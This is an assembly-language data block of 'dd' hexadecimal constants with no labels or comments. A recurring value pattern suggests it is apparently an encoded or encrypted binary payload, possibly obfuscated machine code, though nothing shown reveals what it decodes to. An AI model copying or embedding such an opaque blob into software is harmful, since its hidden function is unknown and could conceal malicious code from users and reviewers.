		dd 85FFD944h, 44D0993Dh, 0EFFD01EFh, 7C623D33h,	56F3F7D9h
		dd 0FBD94C64h, 0FFAF9751h, 0FC6053E8h, 0FFB68BFFh, 44640D8Bh
		dd 0A98DFBD9h, 0EF9710CBh, 51B9AD52h, 9CDCFA02h, 247610EEh
		dd 10CBA98Bh, 3CE8B9AFh, 8502FF32h, 563A0201h, 9DB0FA02h
		dd 0AB7010EEh, 85E924h,	0E924A370h, 0FFBE8BBFh,	24BB7051h
		dd 0F90087D9h, 0BFAF00EFh, 61FFE8FFh, 3D85FFFCh, 0B314899Ah
		dd 901002FFh, 6D907F6Dh, 7F6D907Fh, 907F6D90h, 0AB08037Eh
		dd 0FFD97464h, 0FCD27657h, 7610EE9Ch, 0A17620A9h, 89EE9728h
		dd 740CCBB9h, 10ED24A3h, 8D1097D7h, 970CCBA9h, 0ED9752EFh
		dd 61FBE8FFh, 0BB8BFFFCh, 0BFFD6AC7h, 6187E8FFh, 0FC6AFFFCh
		dd 0A176D710h, 51EE9720h, 9DD8FA02h, 0A17610EEh, 66A51504h
		dd 0CE5F1002h, 2B7E5E2Fh, 0EB3F08h, 0D5681097h,	8BED01B6h
		dd 0EFFDA1h, 7464BFFDh,	0EFFD00CAh, 4464AC00h, 7656FBD9h
		dd 9B74501Eh, 7907F524h, 76FF1021h, 0CBB9C721h,	0EFFD10h
		dd 890628FDh, 7ED018Ah,	0EFFDB4h, 0F524A376h, 8BA3C664h
		dd 0EFF089h, 3983EFFDh,	0EFF9C2FFh, 0E81E7656h,	0FD00EFE5h
		dd 0E7D94419h, 56E68901h, 0FD7F3E15h, 0EB3983EFh, 0C2B13B8Bh
		dd 6D90EFF9h, 8A890128h, 7506ED01h, 6DFF1021h, 7F6D907Fh
		dd 0E81E7656h, 0FD00E5E5h, 0E7D94C64h, 1653D33h, 7EDA2F7Eh
		dd 0D88A0317h, 146AD9FFh, 7610EF2Dh, 0EFB7E821h, 0C2B1FD00h
		dd 338BEFF5h, 0EFFD6F07h, 82DA300h, 15CE64FDh, 0EFFD007Bh
		dd 0E73F5Eh, 0F124AB76h, 0BEAD41A7h, 0B107338Bh, 0A300EFFCh
		dd 7FFD082Dh, 10EF32DFh, 0ED002017h, 0FFFDCF1Ah, 10EF2D00h
		dd 6D907F6Dh, 7F6D907Fh, 907F6D90h, 48BB8ABh, 0EFFF1707h
		dd 851F7600h, 0AB179B0Bh, 8EE51510h, 56BFED01h,	0ECE82076h
		dd 0B902FF33h, 605FE8FFh, 0A35FFFFCh, 7F6D902Ch, 907F6D90h
		dd 48BB8ABh, 0EFF86707h, 851F7600h, 0AB179B0Bh,	8EE51510h
		dd 56BFED01h, 1CE82076h, 0B902FF34h, 605FE8FFh,	0A35FFFFCh
		dd 7F6D902Ch, 907F6D90h, 0B5681097h, 8BED01B6h,	0EFFDA1h
		dd 7464BFFDh, 0EFFD00CAh, 30037E00h, 0B189BAAEh, 0B8AB14CBh
		dd 20CBB18Dh, 2671815h,	0CBB98B10h, 3302CE24h, 74C5D40Bh
		dd 91B52483h, 24AB762Bh, 0FD0654C5h, 0EB7600EFh, 49770A8h
		dd 250E876h, 0EE9CB8FAh, 4287E10h, 0FB7462B6h, 641075EEh
		dd 45CBD944h, 287C07C6h, 0AF9756A9h, 6053E8FFh,	58BFFFCh
		dd 0CBD94464h, 7C663D85h, 0FCBDFBD9h, 28FD00EFh, 0FFD944h
		dd 8300EFFDh, 0CBB18BB0h, 24BB7638h, 0D94428EDh, 0EFFD06F7h
		dd 91F37600h, 16042C7Eh, 0CB818BEBh, 50EC7614h,	9CB8FA02h
		dd 0DC7610EEh, 3277640h, 0FED16400h, 0ED14C107h, 446458F3h
		dd 378BF7D9h, 6CFEE16Ch, 0F3A7F9C3h, 0D9446659h, 643375F7h
		dd 8BFFD944h, 7624CBB1h, 0AFE92493h, 44663C3Bh,	5C7CFFD9h
		dd 90FAC6B8h, 61F7E8FFh, 0B18BFFFCh, 0B8AD1CCBh, 0FF352EE8h
		dd 0E8FFB802h, 0FFFC605Fh, 20CBB18Dh, 0B524AB3Ah, 1002FF10h
		dd 0FF8876E8h, 0D94C6402h, 0B2A35FAFh, 0D66995Bh, 0FD00EFFDh
		dd 2CC1C46Ch, 907F6D90h, 6D907F6Dh, 0B8AB53BEh,	185048Bh
		dd 0FCDCFB95h, 0CB8189FFh, 2851514h, 0A18BEFFDh, 2B7E20CBh
		dd 8519CE08h, 0A8349926h, 0F7D96C64h, 50C1F98Bh, 268EF97h
		dd 10FD1FE0h, 18E5515h,	97F864EDh, 0FA0257EFh, 10EE9DD8h
		dd 1D1510AAh, 6CED018Eh, 0F3D4F9C6h, 818B398Fh,	85A010CBh
		dd 0DCFB9500h, 0E0E8FFFCh, 6CFD00EDh, 6485F5C4h, 9CFCFA02h
		dd 207610EEh, 0FF1206E8h, 15CF6402h, 1002FECBh,	59B4A35Fh
		dd 6D00E73Fh, 7F6D907Fh, 907F6D90h, 6D907F6Dh, 0EDC5EC6Eh
		dd 57B9FD00h, 0B4B919CEh, 0DCFD00EFh, 249370C0h, 0D97466E5h
		dd 0CB7988FBh, 0EFFC3Ch, 0BDB9440Eh, 62FD00EFh,	1D2D9BCh
		dd 56F3EFFDh, 0EE97AB89h, 133E968h, 0D97466EDh,	4215AAFFh
		dd 83EFFD01h, 9756E739h, 0FAA3E8EDh, 0F864FD00h, 74FF107Eh
		dd 9AF12493h, 0C0DCA20Bh, 0C5C46EA3h, 2CFD00EDh, 87A853h
		dd 9700EFF9h, 0CBB9C7AFh, 0EED524h, 411510FDh, 64ED018Fh
		dd 24AB70E8h, 3B57BFE1h, 548000AAh, 0EFFD01h, 0FD15FA15h
		dd 0E03D85EFh, 0EEE784h, 0D94C64FDh, 0EF9751CBh, 0EBED68h
		dd 551510FDh, 64ED018Eh, 24AB76F0h, 0F2C06AD9h,	0EFFDE76Bh
		dd 4177E00h, 0FDDE6BF2h, 177E00EFh, 0D56BF208h,	7000EFFDh
		dd 62E524BBh, 52FFD944h, 0AB50EB97h, 0EF833F07h, 24BB7600h
		dd 0D98C62EDh, 0EFFD01ABh, 0EEF968h, 0AB52BEFDh, 0EF832107h
		dd 0B8D27600h, 7010EE9Ch, 0BFBD24ABh, 8C622AFFh, 0FD01ABD9h
		dd 0BE0D8BEFh, 74622AFFh, 0FE55E9FBh, 0F7E8FF1Ch, 3BFFFC61h
		dd 970C9C3Bh, 10A856ADh, 18F4515h, 76E864EDh, 62D924BBh
		dd 89AFD944h, 7E50C4E9h, 3802042Ch, 7462358Bh, 7041AFD9h
		dd 3E762BD3h, 40CBB98Dh, 0E02063Ch, 0BF378B4Ah,	0F3EC1C83h
		dd 45356459h, 10ED018Eh, 246370D6h, 0FD00EEB9h,	0EEFE5C62h
		dd 8B390251h, 0D9B46235h, 0EFFD01ABh, 2BD37041h, 798D3E76h
		dd 0EFFC44CBh, 2063C00h, 378B4A0Eh, 0EC1C83BFh,	151059F3h
		dd 0ED018E45h, 0FBD97C64h, 1ECA18Dh, 0E124A370h, 1A1557BEh
		dd 85EFFD13h, 1B85E03Dh
		dd 8502FF11h, 0FFBAAE42h, 0FC6057E8h, 87FD6AFFh, 10EE2114h
		dd 0D8E81F76h, 6CFD00EFh, 0FFB8F5C4h, 0FC610FE8h, 64A65DFFh
		dd 81B1A2C6h, 0FD02D739h, 7F6DC3EFh, 907F6D90h,	6D907F6Dh
		dd 7F6D907Fh, 8DFB1183h, 0AB00CBB9h, 51D56ABFh,	0EFFD01h
		dd 9DDCFA02h, 10AD10EEh, 18F9D15h, 88C06AEDh, 0B13D32E8h
		dd 0C3FB3983h, 0DD24A376h, 0F3D94464h, 546224F7h, 8989E3D9h
		dd 26E608CBh, 20E7E52h,	740085ADh, 10DD24A3h, 18FA115h
		dd 0D95464EDh, 85FD6AEBh, 24A37000h, 0AC1085EDh, 10AF0085h
		dd 18FA515h, 811510EDh,	6AED018Eh, 33ED89C0h, 0D944640Bh
		dd 0FA0250EBh, 10EE9CE0h, 0B852FCEh, 0B13D95E0h, 0C3FB3983h
		dd 6D907F6Dh, 7F6D907Fh, 6C87FC6Ah, 1510EE22h, 1002FF8Bh
		dd 0CCBB98Bh, 97082B7Eh, 0FA0250EFh, 10EE9EF4h,	9168EF97h
		dd 7ED0130h, 0FF100248h, 3E082B7Eh, 7F6D907Fh, 8CBB98Bh
		dd 0F900037Ch, 0EF4400EFh, 53EFFD01h, 0AB55F776h, 0FFD9B464h
		dd 57EFFD04h, 818D2FCEh, 440E10CBh, 10CBB18Dh, 0FD04EF95h
		dd 10AB51EFh, 18C8915h,	0E8FFB9EDh, 0FFFC6303h,	7E9B3D85h
		dd 9CB8C276h, 0BB7010EEh, 0FFBDED24h, 89C06A28h, 9A268582h
		dd 6AEE970Ch, 411510BDh, 64ED018Fh, 24AB70D8h, 28FFBFEDh
		dd 6CAEF064h, 1510F8C6h, 0ED018EE5h, 0AD97F864h, 51D8F18Dh
		dd 451510AEh, 64ED018Fh, 247B76D8h, 0FD00EBE9h,	0BDAAFBECh
		dd 631FE8FFh, 0B98DFFFCh, 10AD10CBh, 8D2776D5h,	0BC10CB89h
		dd 64F9C76Ch, 246B76D1h, 0FD00EBE5h, 1CFFE92Eh,	832576A5h
		dd 59F3EC1Ch, 0B1A21866h, 5BEE4D5Dh, 0F9002B7Ch, 0E73F00EFh
		dd 907F6D00h, 0D94462ACh, 0CBB9C7EFh, 0EFFD00h,	0FD68BFFDh
		dd 10ED003Ah, 18C7515h,	0D94C64EDh, 91FCC6EFh, 0CBB98Bh
		dd 6D902CA4h, 7F6D907Fh, 907F6D90h, 97EC64A8h, 0B69D6810h
		dd 0A18BED01h, 0FD00EFFDh, 0CA7464BFh, 0EFFD00h, 0CE08037Eh
		dd 0AA74532Fh, 0FCAA74ECh, 0AB08AA76h, 66CD8BB8h, 78640D65h
		dd 0F55864F9h, 0BFF14064h, 618BE8FFh, 2684FFFCh, 0EF970A9Bh
		dd 0EB2AE8h, 0F9C46CFDh, 642BFFB8h, 898B094Dh, 0FD00EFF0h
		dd 0B4A35FEFh, 0C2B2188Bh, 95B8EFF9h, 2CED0039h, 8B1BB08Bh
		dd 0A35F03B8h, 0EFF0898Bh, 5BEFFD00h, 3F5D0A76h, 7F6D00EBh
		dd 57B9A853h, 0FF6AEF97h, 0EFEC6F07h, 1C79500h,	258BEFFDh
		dd 0EF85D707h, 42B7E00h, 0AE561F76h, 0EED50628h, 4B07FD00h
		dd 7800EFECh, 64BD742Fh, 8DFBD96Ch, 0AA55CB83h,	8D491510h
		dd 0C46CED01h, 88C06AF5h, 0E7BB8BE7h, 5BB2A35Fh, 1553B93Eh
		dd 0EFFD11F3h, 179B3D85h, 0E8FFB8A8h, 0FFFC61F3h, 0E19B3D85h
		dd 0F8E8BCABh, 6AFD00FEh, 5F0688C0h, 3D33B2A3h,	7F6DC3B4h
		dd 907F6D90h, 6D907F6Dh, 64EDEC6Ch, 8BF3D944h, 7720CBB1h
		dd 0B9D124BBh, 85FD6Ah,	0FD6AEF97h, 0FBD94466h,	18CBB189h
		dd 0E124BB75h, 8E911510h, 4C64ED01h, 0B989C7D9h, 0AB7610CBh
		dd 5462D124h, 7650EBD9h, 0BEDD24ABh, 20CBB18Bh,	2B0087AFh
		dd 0BEAD10EFh, 6247E8FFh, 0A98BFFFCh, 2B7E28CBh, 6A1F7618h
		dd 0E8FFBD02h, 0FFFC612Fh, 10CBB98Bh, 1D1510ADh, 64ED018Eh
		dd 0C46CA3C6h, 6D902CEDh, 7F6D907Fh, 907F6D90h,	7008037Eh
		dd 62F924A3h, 51EFD954h, 97C0DCAFh, 0BF026AEAh,	14CBB989h
		dd 0E524AB74h, 0EF84D707h, 742F7800h, 0FD68B9D0h, 7FD00EEh
		dd 0EF8AC0h, 76042B7Eh,	0CBB98B1Fh, 0FFB9AD04h,	0FC61ABE8h
		dd 0CBB18BFFh, 0A707AC04h, 7600EF84h, 2B7E5E29h, 0C0DC3E08h
		dd 3E082B7Eh, 7F6D907Fh, 907F6D90h, 97EC64A8h, 8A7D6810h
		dd 3087ED01h, 9910EEB2h, 0EFFD004Eh, 898BAD00h,	0FD00EFD8h
		dd 0AF1181EFh, 53EFFD01h, 9889B8ABh, 3EC16807h,	6D07ED01h
		dd 7EFF1003h, 19CE042Bh, 139A3B3Bh, 0B08B2FCEh,	0E274641Fh
		dd 0EFFD00h, 765BB1A2h,	663E5D0Ah, 75661975h, 2575662Dh
		dd 66297566h, 56BF0175h, 0FD04EF95h, 47E8FFEFh,	8BFFFC61h
		dd 195D6625h, 6BF2DED4h, 0EFFDB7h, 0ADD0AA70h, 10AE0885h
		dd 18F9D15h, 214566EDh,	6BF2C6D4h, 0EFFD9Fh, 70C89A74h
		dd 0B9ACC8A2h, 8BEE9756h, 76523FA8h, 0EE9D04D2h, 89380210h
		dd 0B88B33B8h, 993D8527h, 0D907AD7Eh, 7E00EF8Bh, 1F76042Bh
		dd 0FE574889h, 88891002h, 27B88D37h, 0C8A27650h, 0FC6AB9ACh
		dd 0BD2D5564h, 45662AFFh, 89C06A21h, 2F78C7BDh,	41002FEh
		dd 3A00EFFCh, 1003BC6Ah, 0EEFDFFh, 0FC0087FDh, 7A1500EFh
		dd 83EFFD76h, 7889EB39h, 1002FE5Bh, 8D3BB889h, 705123B0h
		dd 1003C07Ah, 8D62AFFFh, 2FF1139h, 53688DBEh, 521002FEh
		dd 0AD0664ADh, 0FA020085h, 10EE9D08h, 3ADCAA74h, 1002FCAAh
		dd 60702FFh, 7600EFFDh,	9A76E4B2h, 743478D8h, 0E8FFBCFAh
		dd 0FFFC610Fh, 853FB88Bh, 0AD079B3Dh, 8E1D1510h, 0F66AED01h
		dd 1556E689h, 0EFFD76DDh, 8BEB3983h, 0B88B0798h, 1FB08B3Bh
		dd 0E27464h, 0A200EFFDh, 0A765BB1h, 907F3E5Dh, 0FD9C037Ch
		dd 64AB00EFh, 18E0D35h,	0DAB9B8EDh, 0DCFD00EFh,	249370C0h
		dd 70AB1CF5h, 28F524ABh, 9CE7D944h, 0AD00EFFDh,	2F78D610h
		dd 4C62E175h, 0B9C7E7D9h, 0EF6908CBh, 0FFBEFD00h, 88C06A2Bh
		dd 6EA35FE6h, 0EF61C4h,	81832CFDh, 9AF80CCBh, 24AB7616h
		dd 88C06AEDh, 11DFE8E1h, 5EB002FFh, 0FD9C2B7Ch,	73E00EFh
		dd 0FF1000B4h, 3981B1A2h, 0EFFD0073h, 907F6DC3h, 6D907F6Dh
		dd 7F6D907Fh, 2E71181h,	0A853EFFDh, 0AB3A57B9h,	0EFED24h
		dd 0E8FFEFFDh, 0FFFC614Fh, 0D8FA0250h, 7610EE9Eh, 0EFBDB937h
		dd 0C0DCFD00h, 0E5249370h, 8C212D64h, 0AB1CED01h, 0E924AB70h
		dd 0F7D94C62h, 1EF9550h, 9751EFFDh, 3A0253EDh, 0EFFD68h
		dd 970085FFh, 0FE8FFEFh, 8BFFFC63h, 0FD40560Dh,	2FCE00EFh
		dd 18CB418Dh, 7000EFFCh, 1CE924BBh, 8462AFABh, 0FD01F3D9h
		dd 0EEFD68EFh, 6ABFFD00h, 28FFB9FFh, 0F7D94C62h, 18CB698Dh
		dd 0AC00EFFCh, 0F3E8FFBDh, 85FFFC61h, 0AB0E9B3Dh, 8C191510h
		dd 152ED01h, 1600EFFDh,	0CB918BEBh, 0E8D27610h,	0AE10EE9Eh
		dd 10ABD710h, 5F2FCED7h, 0A05E0278h, 0B43D95E0h, 2E73981h
		dd 6DC3EFFDh, 7F6D907Fh, 907F6D90h, 0FC04037Ch,	0B8AB00EFh
		dd 614FE8FFh, 250FFFCh,	0EE9ED8FAh, 245B7610h, 0FD00EEEDh
		dd 0AB70F864h, 4C62F524h, 9550E3D9h, 0EFFD01EFh, 56ED9751h
		dd 9EDCFA02h, 2F7810EEh, 5EB0F475h, 0FC042B7Ch,	0B93E00EFh
		dd 630BE8FFh, 3D85FFFCh, 0B1A2099Ah, 1EB3981h, 0AAC3EFFDh
		dd 8C151510h, 0B8B0ED01h, 0FD00EFFCh, 0EB3981B1h, 0C3EFFD01h
		dd 6D907F6Dh, 0EBD94464h, 1209556h, 0FD6AAFFDh,	0EF97C06Ah
		dd 0FFBFF474h, 0FC633BE8h, 10FBEBFFh, 18C1D15h,	78F064EDh
		dd 0B1FF7519h, 6107ABC3h, 7EFF1002h, 2F78042Bh,	0FFB9F675h
		dd 0FC6307E8h, 0B13D33FFh, 0EE45C3h, 3E5EEFFDh,	7F6D907Fh
		dd 907F6D90h, 5D1510ABh, 0BFED018Eh, 6337E8FFh,	7D68FFFCh
		dd 64ED0130h, 0FF7915F0h, 39831002h, 9A3D85EBh,	682CA302h
		dd 0FD2EEFFEh, 0FD950085h, 68EFFD03h, 0FD001002h, 8C2D1510h
		dd 0F66AED01h, 1556E689h, 1002FE13h, 0B8EB3983h, 0FD00EFFCh
		dd 7F6DC3B1h, 4FB1181h,	0A853EFFDh, 0B81033B9h,	0BEBAA855h
		dd 0FD00EFFCh, 307168BAh, 6C66ED01h, 9189CBD9h,	9B7430CBh
		dd 1510D524h, 0ED018BE5h, 12C6F864h, 20CB8189h,	0A35FE288h
		dd 0B43D32B2h, 4FB3981h
		dd 76C3EFFDh, 0EBD5246Bh, 68BAFD00h, 7D00EFFDh,	0B8AD55BAh
		dd 64F3E8FFh, 258BFFFCh, 0E288DDD4h, 32B2A35Fh,	3981B43Dh
		dd 0EFFD04FBh, 246376C3h, 0FD00EBD1h, 0ED9755BAh, 87A855h
		dd 0AC40EFFDh, 8E2D1510h, 0F86CED01h, 0D9446602h, 648D74F7h
		dd 18BDD2Dh, 0FC0056EDh, 2FCE00EFh, 24CB818Dh, 0ED24BB70h
		dd 62AFAB1Ch, 68C7D944h, 0FD00EBFDh, 3A0253BFh,	99B0B85h
		dd 0D97C6E9Bh, 9AA74DCBh, 24BB7627h, 70F6DCEDh,	0B9E124A3h
		dd 24A37651h, 0D94462DDh, 0BEAD52C3h, 6107E8FFh, 0B98BFFFCh
		dd 2F7810CBh, 0AD04F776h, 0E924AB3Ah, 0EFFD00EFh, 18CBA98Bh
		dd 1D1510AFh, 64ED018Eh, 8BCFD97Ch, 0FC64CBC8h,	390253FFh
		dd 8B390257h, 0CE14CBB1h, 6AA35F2Fh, 0FB4A0C9h,	39812F68h
		dd 0EFFD04FBh, 907F6DC3h, 6D907F6Dh, 7F6D907Fh,	907F6D90h
		dd 760085ABh, 85FD6A1Eh, 0C7EF9700h, 0FC6563FBh, 83E8FFFFh
		dd 89FFFC61h, 0BBC7EBBBh, 0EFFD00E7h, 0CA93A00h, 0FD00EFFDh
		dd 0EFFCC307h, 742F7900h, 0FC5C4FADh, 2F7910EDh, 85BA75h
		dd 0FD6AEF97h, 0EF970085h, 85FD6Ah, 0FD68EF97h,	877D00EFh
		dd 10EE1FA4h, 0FCDF5B95h, 10FD6AFFh, 18C3115h, 0AD0085EDh
		dd 0EF970085h, 85FD6Ah,	0FD00EF95h, 305568BFh, 4666ED01h
		dd 0F7B807EDh, 0A97400EFh, 5E297614h, 6D907F3Eh, 7F6D907Fh
		dd 907F6D90h, 15F164ABh, 0EFFD00F7h, 8CBB9F6h, 0AB099BFCh
		dd 0EF8CE107h, 42B7E00h, 3F5E2976h, 7F6D00EBh, 1D64AB53h
		dd 0ED018CB5h, 64AAF164h, 18C613Dh, 710628EDh, 4FED018Ah
		dd 10EDFC5Ch, 0A4742F79h, 0BFE94664h, 0C06A2EFFh, 0B38BE089h
		dd 85FD6AFBh, 4AA9500h,	251EFFDh, 0FBAB8B38h, 853C0252h
		dd 760F9B3Dh, 0EF9714A9h, 0B87FD6Ah, 0AD00EFF9h, 0A976D710h
		dd 742F7808h, 8AE8BFF4h, 6CFD009Eh, 4664F9C4h, 89C06AF1h
		dd 881550E6h, 83EFFD71h, 0F8C6EB39h, 0FFFF01B3h, 14A17600h
		dd 78D310ACh, 64F2742Fh, 85E956h, 0FF68EF97h, 0BDFD00EBh
		dd 46642AFFh, 2EFFBFE9h, 0E089C06Ah, 6AFBB38Bh,	950085FDh
		dd 0EFFD04EAh, 8B380251h, 0C08BFFABh, 0FFFC63BBh, 8B380252h
		dd 250FBBBh, 0EBB38B38h, 0E0FA0251h, 0A210EE9Ch, 7F3E5BB1h
		dd 907F6D90h, 0FD00EE45h, 0EFF1C2EFh, 907F6D90h, 6D907F6Dh
		dd 0CB898BB9h, 1510AB08h, 0ED018CB5h, 0AC89C06Ah, 85FD6Ah
		dd 0FD04E795h, 0FA0256EFh, 10EE9E9Ch, 0D2742F78h, 64F54864h
		dd 57E3D954h, 760C9776h, 0DD7614A6h, 0E92E2C8Bh, 76A51CFFh
		dd 0EC1C8325h, 406459F3h, 0E8FFBFF9h, 0FFFC618Bh, 5E2FCE5Fh
		dd 0CE00E73Fh, 0E73F5E2Fh, 907F6D00h, 6D907F6Dh, 0EDFC5C4Fh
		dd 98037C10h, 7900EFFDh, 0DDF4742Fh, 982B7CC0h,	3E00EFFDh
		dd 0DC3D32B9h, 752F79F6h, 0D94462E2h, 0BFCF6AEBh, 40CBB18Dh
		dd 0AB518B97h, 0EFF40B07h, 0F2F7800h, 7E462F68h, 32810A11h
		dd 982B7C5Eh, 3E00EFFDh, 7F6D907Fh, 907F6D90h, 76F164ABh
		dd 10AD14A9h, 18CB515h,	89C06AEDh, 0FBB38BFCh, 85FD6Ah
		dd 0FD04D295h, 0FA0251EFh, 10EE9E9Ch, 9504B976h, 0EFFD0B57h
		dd 0C0FA0252h, 7810EE9Ch, 64F8752Fh, 0C3B1F146h, 3E5E2FCEh
		dd 0BCD1EC6Ch, 8BB8AB55h, 262070Ch, 2F79FF10h, 5EB0F775h
		dd 3983B4A0h, 0EFF5C2C3h, 8BFBBB8Bh, 0FC63A7D0h, 3A0250FFh
		dd 6373C08Bh, 3D85FFFCh, 0A1760E9Bh, 85AB14h, 0FD04E695h
		dd 380251EFh, 52FBAB8Bh, 3D853A02h, 0A976129Bh,	0DE9F9514h
		dd 0FD6AFFFDh, 0EFF90287h, 0D710AD00h, 0AC14A176h, 2F78D510h
		dd 5664EB74h, 238087E9h, 0EF9710EFh, 0EBF868h, 2AFFBDFDh
		dd 0E388C06Ah, 32B2A35Fh, 3983B43Dh, 0EFF5C2C3h, 46642633h
		dd 28FFBFE9h, 0FD89C06Ah, 6AFBB38Bh, 0F768BCFDh, 0BEFD00EBh
		dd 0C06A2AFFh, 7E43E988h, 31810A14h, 75E50683h,	0A05EB0F1h
		dd 6CA6C0DDh, 82DD1C4h,	0E95664FDh, 6A28FFBDh, 8BFC89C0h
		dd 0FD6AFBBBh, 0C3950085h, 50EFFD04h, 258B3802h, 34CE0204h
		dd 1D07D16Ah, 7600EF92h, 2B7E14A1h, 8A97404h, 78D510ACh
		dd 64ED742Fh, 4664F556h, 9553BDE9h, 0EFFD04C3h,	8B380250h
		dd 4640CBB1h, 0EFFD00EEh, 639B3485h, 0B924AB76h, 0B489C06Ah
		dd 89E7AB8Bh, 0B38BEBB7h, 0E7BC89E7h, 33E7AB8Bh, 0A7898934h
		dd 0E7BB8BE3h, 0EA77666h, 0F94840F2h, 2EE2C16Ch, 0E16CFEF9h
		dd 0B5AFE001h, 0FBB589E7h, 52FBAB8Bh, 3D853A02h, 0A976159Bh
		dd 14A17608h, 952C85ADh, 0EFFD04C2h, 85380251h,	0A20C9A3Dh
		dd 2FCF5DB1h, 2C2B7E5Bh, 7600E73Fh, 0AD7608B9h,	8107AD14h
		dd 7600EF93h, 2B7E14A1h, 0CA97404h, 78D510ACh, 64EF742Fh
		dd 5462E946h, 9752FFD9h, 0EBF368C3h, 0FFBFFD00h, 0E94E642Ah
		dd 6A28FFBEh, 8BE089C0h, 0FD6AFBABh, 0DC950085h, 52EFFD04h
		dd 0BB8B3802h, 3A0250FBh, 0F9B3D85h, 9714A176h,	87FD6AEFh
		dd 0EFF932h, 76D710ACh,	10AF14B9h, 742F78D5h, 0E94664F2h
		dd 0EF970085h, 0EBC868h, 2AFFBFFDh, 0F2755EB0h,	10EDFC5Ch
		dd 0A65D2C77h, 2DD1C46Ch, 907FFD08h, 85681097h,	8BED01B6h
		dd 0EFFDA1h, 7464BFFDh,	0EFFD00CAh, 4464AC00h, 7656FBD9h
		dd 9B74501Eh, 4907F524h, 44FF1037h, 0EFFD00EEh,	50BE3D33h
		dd 6D68B9ADh, 0BFED000Bh, 24AB7450h, 6D0628D1h,	66ED018Ah
		dd 4666E946h, 0ED4E67E5h, 66D54E67h, 4666DD46h,	0E14666D9h
		dd 10083307h, 24A376FFh, 0E1C46CD9h, 64D14666h,	898BA3C6h
		dd 0FD00EFF0h, 0FF3983EFh, 90EFF9C2h, 6D907F6Dh, 7F6D907Fh
		dd 0E81E7656h, 0FD00EFE5h, 0E7D94419h, 56E68901h, 0FD6D9E15h
		dd 0EB3983EFh, 0C2B13B8Bh, 6D90EFF9h, 850C8BB9h, 10A97000h
		dd 9890E93Ah, 10AD10EEh, 18EBD15h, 0D14E64EDh, 10ACFF85h
		dd 18E3D15h, 0D15664EDh, 0FE8FFBDh, 8BFFFC61h, 34EE0733h
		dd 2CA3FF10h, 907F6D90h, 6D907F6Dh, 7F6D907Fh, 4CBA98Bh
		dd 0FF8A2FCEh, 6C19C06Ch, 4198FEF8h, 5985CB02h,	7ED000Dh
		dd 0FF103784h, 7600E73Fh, 2F7818AEh, 0C16CD674h, 0AC0185D5h
		dd 8EBD1510h, 82DED01h,	0D5C16CFDh, 10AC0085h, 18EBD15h
		dd 0FD082DEDh, 64F84264h, 52BFFC52h, 0FD016015h, 0EFF5C2EFh
		dd 10EF1F6Fh, 0ED000D78h, 0FFFDE27Bh, 10EF1F67h, 6D907F6Dh
		dd 7F6D907Fh, 907F6D90h, 148BBAAEh, 4A152D85h, 8BEFFD6Ch
		dd 0F9C46C25h, 0C589DB6Ah, 8B98FEC6h, 0AA56FBB8h, 62F57064h
		dd 0B56FC7Bh, 9700EFFDh, 0BC58F3C2h, 6D07308Bh,	0AEFF1034h
		dd 0EF917D07h, 42B7E00h, 0A65DB1A2h, 7F6D902Ch,	907F6D90h
		dd 6D907F6Dh, 7F6D907Fh, 53E31183h, 0AB553676h,	0B8E94B64h
		dd 0FF13F2E8h, 76F06402h, 0A77614ACh, 14AE7608h, 0AD062F7Eh
		dd 0EF913B07h, 83077600h, 1085EB39h, 0EF1B84E0h, 4529FD00h
		dd 0AE8A97FDh, 0EEA888C7h, 89F3BE8Bh, 0BE8AEDB8h, 0E03D84C7h
		dd 0EF6E84h, 0E54364FDh, 6BF2C06Ah, 0EFFD88h, 0FD00EE44h
		dd 0CBB9C7EFh, 0EFFD10h, 70F66AFDh, 0A3740692h,	4C66E924h
		dd 790FF7D9h, 0EFFD004Fh, 84E00285h, 0FD00EF65h, 64E95364h
		dd 5264B548h, 0E95264F5h, 0E0E951D4h, 0EF7E85h,	0B94864FDh
		dd 9389C96Ah, 14CBB18Dh, 0E524BB70h, 6CAB52BEh,	85F9C0h
		dd 0F96A07ADh, 2F7800EFh, 4C629F74h, 3485FFD9h,	0FBD94C64h
		dd 4C66F974h, 2C8BFFD9h, 63CF064h, 8B4A0E02h, 7610CBB9h
		dd 0EC1C8325h, 0A41C3D85h, 0DEEBD589h, 62E94364h, 4864FB7Dh
		dd 0E94964F5h, 63CD164h
		dd 8B4A0E02h, 0FEE16C37h, 0AC76A41Ch, 8A77614h,	7E14AE76h
		dd 2476062Fh, 4107A850h, 0A8FF1035h, 0EF965107h, 42B7E00h
		dd 0A65DB1A2h, 2CF1C46Ch, 40F27653h, 0AB10EE9Ch, 85AAF164h
		dd 10917000h, 76D310AAh, 10972CA9h, 0C0FA0250h,	7610EE9Ch
		dd 64ED24A3h, 6AFBD954h, 0B389B8FCh, 0CBAB89CFh, 1852EFFh
		dd 0FD6AEF97h, 0B6D68B9h, 85ED00h, 74E8EF97h, 6C02FF1Dh
		dd 4666E1C4h, 0A65EB0D1h, 7FFD082Dh, 907F6D90h,	6D907F6Dh
		dd 7F6D907Fh, 18BF08Ah,	0FCB0FFFFh, 0D27657B9h,	10EE9CB4h
		dd 0F2752779h, 0E275C8E5h, 10EDFC64h, 9DA33802h, 64ED02EEh
		dd 8BE3D974h, 0FD720733h, 2F7900EFh, 159A338Bh,	0FD021815h
		dd 0EBB38BEFh, 0FFBF52E8h, 3583B002h, 0EB3F5E10h, 0FD0D1500h
		dd 338B1002h, 103AEB07h, 10A977FFh, 0CD742F79h,	13E08BBCh
		dd 0FFFFFC61h, 9D05C42Ah, 0D2ED02EEh, 0EFFD96h,	996AEB8Eh
		dd 3802D310h, 604C338Bh, 1510EDFCh, 1002FD13h, 84FFBB8Ah
		dd 0A6D89A3Dh, 7215CE64h, 5FEFFD02h, 3F5E2FCEh,	7F6D00EBh
		dd 907F6D90h, 66681097h, 8BED01B6h, 0EFFDA1h, 7464BFFDh
		dd 0EFFD00CAh, 1C037E00h, 48BB8A8h, 0FFD97C66h,	0FF1676E8h
		dd 88C06B02h, 64A05FFEh, 64F3D94Ch, 0FD00E274h,	2B7E00EFh
		dd 18853E28h, 0FD691015h, 0EB3983EFh, 0CCBB989h, 383B02CEh
		dd 0C3D96C66h, 0C864F674h, 2F78815h, 4358B10h, 8B26CE02h
		dd 0B9C7CFBAh, 10022CCBh, 0C5D402FFh, 8914A074h, 0CBAA8BE4h
		dd 49B283Bh, 0CBEBBFAFh, 0EFFC2087h, 18F9500h, 48E8EFFDh
		dd 6B02FF16h, 24AB75C0h, 763F9AF6h, 7F9514A0h, 68EFFD00h
		dd 0FD00EF4Dh, 10049B07h, 882F79FFh, 880BCBB9h,	0FBB28BCAh
